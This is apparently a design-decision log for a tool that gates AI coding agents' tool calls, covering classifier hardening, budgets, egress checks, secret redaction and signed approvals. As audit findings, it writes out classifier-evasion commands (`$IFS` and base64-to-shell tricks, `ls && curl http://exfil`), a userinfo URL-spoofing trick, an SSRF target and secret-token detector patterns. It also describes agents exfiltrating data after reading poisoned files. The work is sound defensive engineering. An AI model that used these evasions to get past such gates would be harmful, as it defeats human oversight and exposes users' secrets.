  - *Expose `hostkit` as a library so the in-process leg can call it.* A crate-structure
    change to serve one test; the six-line stand-in is labelled as such instead.
- **Related:** D46, D48, D59; `docs/demos/one-kernel/roots-world.yaml`,
  `docs/demos/one-kernel/roots-cases.yaml`, and the two `*_path_scope` tests in
  `crates/cli-harness/tests/one_kernel.rs`.

---

## D62 — A command classifier without a catch-all is a compile error, not an author's choice

**Date:** 2026-08-14. **Closes findings #19 and #20.**

- **What the classifier actually buys.** `command_classes` matches patterns against a shell
  command line, and that is a heuristic: `"curl" http://x`, `curl$IFS'...'` and
  `echo <base64> | base64 -d | sh` all evade the pattern lists, by construction and forever.
  The security property was never "the patterns catch everything". It is **where an unmatched
  command lands** — `default_to`, which every shipped manifest points at an
  approval-required, network-effectful class. Evasion downgrades into the stricter bucket.
- **Which made the field's optionality the real hole.** Omit `default_to` and an unmatched
  command falls back to the *raw* action — for a `bash`-shaped action, typically ambient
  `Process`, which no transition policy denies. Measured: a world declaring classifiers with no
  `default_to` compiles clean, denies `curl http://x` in a tainted session, and **allows**
  `python3 -c 'import socket…'` in the same session. The safety of the whole mechanism rested
  on a field the schema treated as decoration.
- **Also: one classifier per action.** `classify_command` resolves with `.find()`, so a second
  entry for the same action silently never runs — and splitting a long pattern list across two
  blocks is exactly how an author would reach for that. Channels and base actions were already
  duplicate-checked; classifiers were the gap in the same family.
- **The decision.** `validate()` now rejects both. The `default_to` check runs *last* in the
  per-classifier pass, so a manifest with several problems still reports the more specific one
  first.
- **Alternatives rejected.**
  - *Default `default_to` to the most restrictive declared class.* Silently correct, and it
    guesses. "Most restrictive" is a judgement about the author's ontology that the compiler
    should not be making on their behalf, and a manifest that reads as permissive while
    behaving otherwise is its own hazard.
  - *Warn instead of erroring.* Warnings on a governance manifest get read once. The failure
    mode being prevented is arbitrary shell in a tainted session.
  - *Leave it and document the requirement.* This is the third finding in this family where
    prose stated an invariant nothing enforced (see D60, D61). Documentation was already
    available and had not helped.
  - *Accept the breaking change quietly.* It is breaking for any third-party manifest that
    omitted the field — those manifests are exactly the vulnerable ones, and the error text
    names the field and explains the consequence.
- **Related:** D36 (kernel-side classification), D44; finding #17 (class *ordering* is a
  separate hazard in the same surface and remains open);
  `crates/compiler/src/loader.rs`.

---

## D63 — A command claimed by two classes is ambiguous, and ambiguity fails closed

**Date:** 2026-08-14. **Closes finding #17; completes the classifier hardening begun in D62.**

- **The hole.** `classify_command` returned the **first** class whose patterns matched, so
  declaration order decided a security verdict. A world listing a permissive class before a
  restrictive one classified `ls && curl http://exfil` by its `ls` prefix: measured in a fully
  tainted session, bare `curl http://exfil` was DENY while `ls && curl http://exfil` was
  **ALLOW**. Prefixing `ls &&` bypassed the taint floor.
- **Latent, but the language invited it.** All shipped manifests order network-first with no
  permissive class, so none was vulnerable. But "list my safe commands first" is the natural
  authoring instinct, nothing documented that ordering carried security weight, and nothing
  validated it. The kernel's own test asserted `ls && curl` classifies as network — true only
  because that fixture happens to have no earlier-matching class. The suite encoded the safe
  ordering without ever stating the rule.
- **The decision.** Every class is evaluated. Exactly one matching target resolves to it; none
  resolves to `default_to`; **two or more different targets resolve to `default_to`**. A command
  line that looks like two different things is two different things, and the honest answer is
  the classifier's own fail-closed bucket rather than whichever entry the author typed first.
  Several classes pointing at the *same* target is not ambiguity — otherwise splitting a long
  pattern list for readability would silently fail closed.
- **D62 is what made this possible.** Ambiguity needs somewhere safe to go, and `default_to` is
  now mandatory. The two findings fix each other: without the catch-all requirement, "fail
  closed on ambiguity" would have meant falling back to the raw action — ambient `Process`,
  outside the taint floor — which is the very hole D62 closed.
- **Alternatives rejected.**
  - *Evaluate all classes and pick the most restrictive match.* The obvious answer, and it
    requires a severity ordering over `SideEffectClass` that does not exist. `SideEffectClass`
    derives `Ord`, but from **declaration order** — ranking by it would encode policy in enum
    layout, silently, and change meaning whenever a variant is inserted. Inventing a severity
    table is exactly the kind of judgement about the author's ontology that D62 declined to make.
  - *Reject at compile time when a lower-severity class precedes a higher-severity one.* Same
    missing severity ordering, plus pattern overlap is undecidable in general, so the check
    would be both unprincipled and incomplete.
  - *Document that ordering is security-critical and leave the behaviour.* The fourth finding in
    this family where prose stated an invariant nothing enforced. Documentation was available
    and had not helped.
  - *Keep first-match-wins but warn on overlap at compile time.* Overlap is a property of
    command strings, not patterns; `ls ` and `curl ` do not overlap as patterns while
    `ls && curl` matches both.
- **A limitation found while shipping it.** The WASM freshness check (D60) did **not** catch the
  resulting artifact staleness: `classify_command` is not reachable through the exported
  `preview()` surface, so the semantic comparison saw no difference. An mtime anchor against the
  engine's sources now runs first — the version anchor added at 0.2.2 only moves at release, so
  within a release window a stale reference build still compared vacuously. Belt and braces:
  mtime catches "you did not rebuild", the semantic cases catch "the rebuild changed answers".
- **Related:** D36, D44, D62; `crates/harness-types/src/compiled.rs`,
  `crates/harness-preview/src/gate.rs` (golden vectors).

---

## D64 — Budget counters are carried session state, and a world that counts calls requires them

**Date:** 2026-08-14. **Closes the Codex-scan finding "runtime budget counters are reset at gate
and agent decision boundaries".**

- **The hole.** `Budget` and `budget_exceeded` were complete and correct; nothing ever supplied
  them a non-zero `BudgetUsage`. `gate()` and the agent orchestrator both constructed
  `BudgetUsage::default()` per decision, so every call was evaluated as the session's first.
  `max_commands_per_task`, `max_network_calls`, `max_file_writes` and
  `max_tokens_per_session` were decorative in every manifest that declared them — including
  all three live ones.
- **The decision: budgets are carried exactly like taint.** The kernel is pure and each hook
  invocation is a separate process, so counters travel in `GateContext.usage`, come back
  charged in `GateResponseContext.usage`, and the adapter persists them in a `usage-<session>`
  sidecar beside the taint marker. The mcp-gateway is one long-lived process and keeps them in
  memory; the orchestrator owns a live session and threads a `&mut BudgetUsage` next to its
  existing `&mut Taint`.
- **Charging lives beside the limit.** `charge()` sits immediately above `budget_exceeded()` in
  `disposition.rs` and mirrors its categories. A limit whose charge lands in a different bucket
  is a limit that never binds, and the only defence against that drift is adjacency plus a test.
  Only an ALLOW that will actually run is charged — a refusal must not push a session toward
  its limit.
- **Omission fails closed, scoped to worlds that count.** `missing_usage` mirrors
  `missing_path`: a control a thin adapter can disable by leaving a field out is not a control.
  It fires only when the manifest declares a *counted* limit; `command_timeout_ms` bounds one
  execution and is enforced by the executor, so it does not oblige a caller to carry counters.
  Unreadable or corrupt counters fail closed for the same reason, and unpersistable ones refuse
  the call they would have charged (D59's rule, applied to budgets).
- **Breaking for the wire ABI, deliberately, without a version bump.** Requiring `usage` under a
  counted budget is the fourth fail-closed hardening of v1, after `taint`, `source_channel` and
  `path`. Bumping `v` would let a caller pin v1 and keep running ungoverned, which is the
  condition being removed.
- **Alternatives rejected.**
  - *Default missing usage to zero.* Preserves compatibility and preserves the finding: any
    caller that omits the field gets an unlimited session, silently.
  - *Accumulate counters inside the kernel.* Would make `evaluate` stateful and destroy the
    property the whole design rests on — a pure, replayable decision function.
  - *Track usage in the trace store and read it back at decision time.* Gives the kernel I/O by
    another route, and makes a verdict depend on a store that may be absent, remote, or slow.
  - *Charge on the ASK, not on the execution.* An approval the human declines would consume
    budget, so repeatedly declining would exhaust the session.
- **Known limit, unchanged by this.** An over-budget verdict is `REPLAN`, and neither Claude
  Code nor Antigravity has a "propose a smaller step" channel, so the adapters fall through to
  the host's own permission flow rather than denying. In replace mode that means the human is
  prompted rather than silently allowed. Tokens are still never charged at the gate — only a
  caller that has seen a model response can count them.
- **Related:** D24 (the gate ABI), D59 (persist-or-refuse), D46/D61 (`missing_path`, the same
  shape); `crates/world-kernel/src/disposition.rs`, `docs/harness-gate-abi.md` §3/§4/§6.

---

## D65 — The web handler enforces its own egress policy; the command handler still cannot

**Date:** 2026-08-14. **Closes findings #11 and #12.**

- **#12: `WebHandler` ignored the spec's `NetworkPolicy`.** A spec built with
  `NetworkPolicy::Disabled` still made the request. The asymmetry with `CommandHandler` is the
  whole point: a subprocess opens its own sockets and the handler cannot police them, so D47
  makes it fail closed. The web handler *is* the thing performing the egress, so it can enforce
  the policy — and now does. `Disabled` refuses; `AllowHosts` matches the URL's real host.
- **The URL parser is hand-rolled, deliberately.** A security decision keyed on "the host" must
  make visible what it thinks the host is. The bypass that matters is **userinfo**:
  `https://docs.example@evil.example/` has host `evil.example`, and any check that asks whether
  the URL *contains* an allowed host reads it as allowed. Userinfo is split at the **last** `@`,
  IPv6 literals are unbracketed, trailing dots and case are normalised, and each of those has a
  test.
- **Loopback, link-local and private ranges need naming explicitly.** An allowlist entry may
  name `127.0.0.1` — a local dev server is a legitimate target — but a broad or suffix entry
  must not silently reach `169.254.169.254`. This is SSRF hygiene, not policy invention.
- **The finding's second half: the policy is never configured.** `ExecEnv.network` defaults to
  `Disabled` and *nothing in the codebase sets it to anything else*, so enforcing it correctly
  turns web fetch off until a caller grants egress. That is the right default and it is worth
  stating plainly: before this change the field was inert, so nobody noticed it was unset. The
  manifest has no vocabulary for an egress allowlist yet — the caller must supply `ExecEnv`.
  Blast radius is the in-process agent loop (demos and tests), not the deployed hook adapters,
  which are decision-only and never execute.
- **#11: a timed-out command left its descendants running.** `child.kill()` signals the direct
  child only, so `sleep 300 &` survived its parent's timeout. Worse, a surviving descendant
  inherits the stdout/stderr pipes, so the reader threads never saw EOF and `out_reader.join()`
  could block **forever** — the timeout path, whose entire job is to bound a command, could
  hang the executor instead. Measured: the two regression tests take 31.8s and fail without the
  fix, 2.0s and pass with it.
- **The child gets its own process group and the group is killed.** `SIGKILL` rather than
  `SIGTERM`: this path has already waited out the command's whole timeout budget, so there is
  no grace period left to offer.
- **`nix` rather than `libc`, to keep the workspace free of `unsafe`.** `killpg` via raw `libc`
  would be three lines and one `unsafe` block; it would also be the first `unsafe` in 20k lines
  of a security tool. The safe wrapper costs a dependency and keeps the property.
- **Windows is not fixed and says so.** Bounding a process tree there needs a Job Object the
  executor does not create, so a timed-out command may still leave descendants. Stated in the
  code rather than left for someone to discover.
- **Alternatives rejected.**
  - *Pull in a URL crate for parsing.* Reasonable, and it hides the userinfo rule behind a
    dependency in the one place a reviewer most needs to see it.
  - *Denylist known-bad hosts instead of an allowlist.* The policy type is already an allowlist;
    a denylist would invert the failure direction to open.
  - *`SIGTERM` then `SIGKILL` after a grace period.* Doubles the worst-case time on a path that
    exists to enforce an upper bound the command has already blown through.
- **Related:** D47 (the command handler's fail-closed), finding #10;
  `crates/executor/src/handlers/{web,command}.rs`.

---

## D66 — The audit log scans values for secrets, and refuses to guess

**Date:** 2026-08-14. **Closes finding #17.**

- **The hole.** Redaction matched a field's **key** or dotted path against the manifest's
  `observability.redact` patterns. Every secret that arrives inside an ordinary value had no
  matching key and went to the trace verbatim: a bearer token in `command`, an `api_key` in a
  `url`, a password in a `git clone` URL, a private key echoed into a file.
- **Why the obvious fix is wrong.** Adding `command`, `url` and `body` to the default redact
  patterns would mask the whole value. A trace in which every command reads `[REDACTED]` is not
  an audit log; it is a log that something happened. The value has to survive and the secret
  inside it has to go, which means scanning the string and masking only the offending span.
- **The detectors are few, and that is the design.** Each is either an issuer-defined shape
  (`ghp_`, `github_pat_`, `AKIA`/`ASIA`, `AIza`, `sk-`/`sk-ant-`, `xox*-`, `glpat-`, `npm_`, a
  JWT header segment, a PEM private-key envelope) or a syntactic position that is a secret by
  definition (an `Authorization`/`Cookie` header value, `?token=`, the password half of URL
  userinfo). High-entropy heuristics and bare hex runs are excluded.
- **Because a redactor that guesses fails twice.** It corrupts the audit record, and it teaches
  the reader that `[REDACTED]` is noise. A test asserts the negative case explicitly — ordinary
  commands, `task-force`, `?page=2`, `my_secret=` outside a query position all pass through
  byte-identical.
- **A safety net, not a replacement.** Naming your secrets in `observability.redact` is still
  better than hoping a scanner recognises them; this catches what the manifest did not name.
- **Alternatives rejected.**
  - *Add `command`/`url`/`body` to the default patterns.* Destroys the audit value of exactly
    the fields an auditor most needs.
  - *Entropy scoring over every string.* Flags base64 payloads, hashes, UUIDs and minified
    code; the false-positive rate is the failure mode.
  - *A regex engine.* Not in the offline crate set, and for a security control that must be
    read and trusted, an explicit scanner is easier to audit than a pattern table.
  - *Mask at write time in the store only.* Redaction belongs on the value before it reaches
    any sink, including bundles and replay.
- **Related:** E4.2, invariant 15; `crates/trace-store/src/{secrets,redact}.rs`.

---

## D67 — The approval log is signed, and an approval is bound to the policy that granted it

**Date:** 2026-08-14. **Closes the last P2 of the security sweep.**

- **The hole.** The approval store is append-only JSONL, and it is the one file in this system
  whose contents *grant* something. Anything able to write it could append a token already in
  the `Approved` state and manufacture a human decision that never happened; `load` folded it
  into the token set without a murmur. Separately, an approval bound to `world_id` but not to
  the compiled manifest survived a rewrite of the very rules it was granted under — a world
  keeps its id while its policy changes completely.
- **Every line carries an HMAC-SHA256**, keyed by a 32-byte secret read from `/dev/urandom` on
  first use and kept beside the log at `0600`, opened `O_NOFOLLOW`, with mode and ownership
  re-checked on every open. Forging a grant now requires the key rather than merely write
  access.
- **A line that does not verify fails the whole load, rather than being skipped.** A store that
  has been modified by something without the key is not a store to keep answering from, and the
  failure direction is safe: no approvals means the human is asked again. There is deliberately
  no lenient path for an unsigned line either — from the verifier's side, "unsigned" and
  "forged" are the same thing.
- **HMAC is implemented here rather than imported.** The offline crate set has `sha2` and not
  `hmac`. It is RFC 2104 in about twenty lines, checked against three RFC 4231 known-answer
  vectors including the longer-than-block-size key that exercises the digest branch. A
  hand-rolled MAC without known-answer tests would be worse than no MAC, because it would look
  like protection. MAC comparison is constant-time; a `==` on the hex would turn forgery into
  32 cheap searches.
- **`manifest_hash` joins the binding.** `world_id` says *which* world, `manifest_hash` says
  *which version of it*, and an approval now dies when either moves.
- **Location beats cryptography, and the code now says so.** The CLI keeps the store in a
  tempdir; a comment proposed moving it to `.agents/` in a deployed tool, which is inside the
  project being governed and therefore exactly wrong. Same mistake as D58 (the kernel inside
  `node_modules`) and D57 (the control plane): anything the enforcement depends on must live
  outside what it enforces upon. The MAC is what remains true when that assumption fails.
- **Alternatives rejected.**
  - *Rely on filesystem permissions alone.* They are the primary defence and they are exactly
    what fails in the scenario the finding describes — a store reachable by the governed
    project.
  - *Sign the whole file rather than each line.* Breaks append-only writing: every append would
    rewrite and re-sign the log, and a crash mid-write would void every past approval.
  - *A hash chain instead of a MAC.* Detects reordering and truncation but not appending, since
    anyone can continue an unkeyed chain. Appending is the attack.
  - *Derive the key from a passphrase or machine id.* A machine id is not a secret, and a
    passphrase prompt in a hook that must run non-interactively is a non-starter.
  - *Skip bad lines and carry on.* Turns a detected forgery attempt into a silent partial load.
- **Known limits.** The key sits beside the log, so an attacker with read access to that
  directory can forge freely — the MAC defends against write-without-read, which is the
  realistic case for a governed project directory, not against full compromise. Windows ACLs
  are not checked; only the MAC binds there. And `/dev/urandom` is the only CSPRNG wired up, so
  non-unix platforms refuse to create a store rather than invent a weak key.
- **Related:** D57, D58 (the same "outside what it enforces upon" rule), E6.2–E6.4;
  `crates/trace-store/src/{integrity,approval}.rs`.

---

## D68 — Adapters rename host arguments into the manifest's vocabulary; they do not add to it

**Date:** 2026-08-14. **Closes finding #23/#27.**

- **The hole.** `alias_neutral_args` mapped Antigravity's PascalCase keys onto the neutral ones
  by *adding* the neutral key and keeping the host spelling, on the reasoning that an audit
  record might reference the original. Object schemas are closed by default (an undeclared
  argument is rejected), so the adapter was injecting a second key the manifest author never
  wrote and could not anticipate. Any action with a `schema` therefore returned
  `schema_violation` on that host no matter how well-formed the call was — schemas and
  cross-host portability were mutually exclusive, and nothing said so.
- **The decision.** Rename. The host's spelling is a transport detail; the call, expressed in
  the manifest's vocabulary, has one name for one argument. The kernel never needed the host
  copy: the classifier reads `arguments[arg]` and the resolved path travels out-of-band in
  `GateRequest.path`, so nothing downstream was consuming the original.
- **What deliberately did not change.** A host argument the manifest does not declare still
  fails a closed schema. That is the security property, not collateral damage: an undeclared
  argument is input the kernel was never asked to judge, and quietly dropping it would mean
  deciding on a call different from the one that executes. `additionalProperties: true` is the
  explicit way to say you accept unjudged extras. Both halves are pinned by tests.
- **Alternatives rejected.**
  - *Teach the kernel which host keys to ignore.* Puts Antigravity's vocabulary inside the pure
    kernel, which is the thing the adapter layer exists to prevent.
  - *Strip undeclared arguments in the adapter so closed schemas always pass.* Makes the kernel
    judge a call that differs from the one the host runs — a governance gap dressed as
    convenience, and strictly worse than a refusal.
  - *Default schemas to `additionalProperties: true`.* Inverts a fail-closed default across
    every world to fix one host's spelling.
  - *Document it and move on.* That was the state being fixed; the constraint was undocumented
    folklore, discoverable only by hitting `schema_violation` on exactly one host.
- **Residual worth knowing.** The neutral vocabulary has three path spellings (`path`,
  `file_path`, `notebook_path`), so a schema written against one does not match an adapter that
  normalises to another. Narrowing that is a separate change to the neutral vocabulary itself.
- **Related:** D36, D48, D61; `crates/cli-harness/src/agy_hook.rs`,
  `crates/world-kernel/src/schema.rs`.

---

## D69 — The source channel is declared by the operator, because no host will tell us

**Date:** 2026-08-14. **Closes finding #22/#21.**

- **The complaint was fair.** Both live adapters hardcoded `source_channel: "user_prompt"`, the
  most-trusted channel, for every call — including one the model proposed immediately after
  reading a poisoned file. The gate has careful machinery here (`parse_channel` fails closed on
  an unknown channel, with a comment about thin adapters not upgrading an unknown proposer),
  and both real hosts bypassed all of it with a constant.
- **It cannot be derived, and that is a fact about the hosts rather than a shortcut.** A Claude
  Code PreToolUse event carries `tool_name`, `tool_input`, `session_id`, `cwd`,
  `permission_mode`. An Antigravity one carries `toolCall`, `modelName`, `stepIdx`,
  `workspacePaths`, `transcriptPath`. Both describe *what is about to run*; neither says who
  asked for it. An adapter that claimed to know would be guessing, and a guess that upgrades
  trust is the worst possible direction to guess in.
- **So it is declared.** Both adapters take `--source-channel`, defaulting to `user_prompt` so
  nothing changes for an existing install. Its value is that an unattended or background
  session can be run at a lower trust: measured against the live `.claude/cc-world.yaml`, a
  `Write` is `allow` under the default and **ABSENT** under `--source-channel web_fetch`, while
  a `Read` still passes — the capability matrix shrinking exactly as the manifest says it
  should. An undeclared channel still fails closed.
- **What this does not pretend to be.** With the default left alone, channel trust does no
  work. The control that actually catches "the model read something poisoned and then tried to
  send it somewhere" is data-flow taint, which is enforced regardless of this field. Saying so
  is better than the previous state, where the code implied a control that was inert.
- **Alternatives rejected.**
  - *Infer the proposer from the transcript* (both hosts do provide a path to it). It means
    parsing an undocumented, host-internal format, doing file I/O on the hook's hot path, and
    re-deriving a guess every call — to produce something the host could simply have told us.
    If a host ever reports the proposer, deriving becomes a two-line change.
  - *Default to a lower-trust channel.* Honest-looking and immediately wrong: it would silently
    remove capabilities from every existing install, and "the model proposed it" is true of
    every call in a hook-based integration, so the label conveys nothing while the capability
    loss is real.
  - *Use `stepIdx` as a proxy* (step 0 ≈ closest to the user's request). A heuristic dressed as
    provenance, and trivially wrong for a multi-step task the user explicitly asked for.
  - *Remove `source_channel` from the ABI.* The in-process orchestrator does know real
    provenance per perception, and the field is doing genuine work there.
- **Related:** D24 (the gate ABI), D37, D48; `crates/cli-harness/src/{cc_hook,agy_hook}.rs`.

## D70 — The publish path is rehearsed on every pull request, from a shared script

**Context.** `release.yml` runs only on a tag. Everything after the compile — the artifact
round-trip, unpacking four archives, filling the platform packages, packing the tarballs — sits
behind `if: startsWith(github.ref, 'refs/tags/')` and therefore executes for the first time on a
tag push, inside the job that publishes to npm. An npm version cannot be republished, so first
contact with a bug happens at the one point in the pipeline that has no undo.

That path had already produced two incidents, both caught by a human dry-running steps by hand
rather than by anything in the repository: GNU tar cannot read a zip (the Windows package would
have shipped empty), and `v0.3.1` went out as two platforms of four. A third was latent — see
below.

The proximate trigger was Dependabot. `actions/upload-artifact` and `actions/download-artifact`
appear **only** in `release.yml`, so the PRs bumping them across major versions arrived carrying a
complete set of green checks that could not, even in principle, have failed. Merging on green
would have been the exact mistake `blog/…/every-check-was-green` is about, in the week it was
published.

**Decision.** The assembly step becomes `scripts/assemble-npm-packages.sh`, called by both
`release.yml` and a new `release-dry-run` job in `ci.yml`. The CI job builds one real binary,
produces all four archives in the release's layout and names, uploads them as four separate
artifacts, **deletes the local copies**, downloads them back with `merge-multiple: true`, and then
runs the release's own steps in order. Deleting before the download is the load-bearing detail: it
is what makes the round-trip the thing under test rather than a formality.

A second guard, `scripts/check-npm-pack.mjs`, asserts that the tarballs npm *would* publish
actually contain their payload.

**The shared script is the decision, not an implementation detail.** A copied step would drift
from the one it rehearses, and a check that has drifted from the thing it checks is this
repository's most reliable failure mode — the rotted demos, the stale WASM, three tests asserting
a vulnerability. The rehearsal must be the performance.

**What it caught immediately, which is the argument for it.** Deleting the `files` allowlist from
a platform `package.json` — a plausible tidy-up — makes npm fall back to `.gitignore`, which
ignores `harness` and `LICENSE-*` because they are build outputs. The package then publishes
successfully, installs successfully, and has no binary. `npm/verify-packages.js` reports
**"npm layout OK"**. Verified by doing it: the existing guard passed, `check-npm-pack.mjs` failed
with "would publish WITHOUT harness".

- **Alternatives rejected.**
  - *`npm publish --dry-run` in CI.* Tried first, and it does not do what its name suggests: it
    contacts the registry and fails with "cannot publish over the previously published versions"
    at any version already on npm — which is every commit between releases. It would have been a
    permanently red job. `npm pack --dry-run` is local and covers the tarball contents, which is
    the whole delta. Recorded in the workflow so it is not helpfully re-added.
  - *Build all four targets in CI.* Three extra runners, including macOS and Windows, on every
    pull request, to test packaging rather than compilation. One real binary in four archives
    exercises the same code; `check` and `cross` own the compiler.
  - *Rely on `workflow_dispatch` against `release.yml`.* It exercises the build job only — the
    `npm` job is tag-gated too — and it requires someone to remember. A check nobody runs is the
    problem, not the solution.
  - *A draft GitHub release to exercise `softprops/action-gh-release`.* Rejected as the wrong
    trade: it creates real, visible releases on every pull request. **That action therefore stays
    unrehearsed, and this is a known residual** — it is the only step of the publish path this job
    does not cover.
- **Related:** D56, D58 (the npm layout this protects); `scripts/assemble-npm-packages.sh`,
  `scripts/check-npm-pack.mjs`, `.github/workflows/{ci,release}.yml`.

### D70 amendment (2026-08-15) — what the first candidate found, including about D70 itself

`v0.4.2-rc.1` was cut for one reason: `softprops/action-gh-release` runs only on a
tag, so D70's own residual said the only way to exercise it was a candidate. It was
exercised — four platform builds, eight assets, and the GitHub release correctly
marked as a prerelease. **The candidate then failed on `check-npm-pack.mjs`, one
step before publishing.** Nothing reached npm.

Two findings, and the second is the one worth keeping.

1. **`npm pack --json` has two output shapes.** npm ≤ 11 returns an array of
   entries; npm 12 returns an object keyed by package name. The release job runs
   `npm install -g npm@latest` because trusted publishing needs ≥ 11.5.1, while
   `release-dry-run` used whatever `setup-node` bundled. So the rehearsal ran npm 11
   and the performance ran npm 12. **This is the third instance of one rule** —
   after the shared assembly script and the action-pin parity guard — and the first
   where the drifting component was a *tool* rather than a file in this repository.
   The dry-run now upgrades npm the same way.

2. **The guard could not tell "I cannot read the tool" from "the package is
   broken."** Handed output it did not understand, it reported *every file missing
   from every package* — a verdict about the artifact, when the truth was that it
   had failed to inspect the artifact. **That is the exact confusion this project
   published a post about, pointed the other way.** There, a failure to *record* a
   decision was treated as permission to proceed; here, a failure to *reach* one was
   treated as a defect. Both come from the same place: at the call site, "no answer"
   and "a negative answer" have the same shape, and only one of them is about the
   thing under test.

   An unrecognised shape now throws, naming the npm version and the observed keys,
   labelled as an instrument failure. **A guard that cannot say "I do not know" will
   eventually say something false with confidence** — and in this case the false
   thing was severe enough to block a release, which is the harmless direction. The
   same bug in a guard that failed open would have published four empty packages.

**Kept, deliberately: `v0.4.2-rc.1`'s tag and GitHub prerelease stay.** They are a
valid, complete GitHub release that simply never reached npm, and re-pushing a
published tag to tidy the history is a worse habit than an honest gap in the version
sequence. `v0.3.1` was deleted and re-cut under a different rule — it was about to
become `latest`.
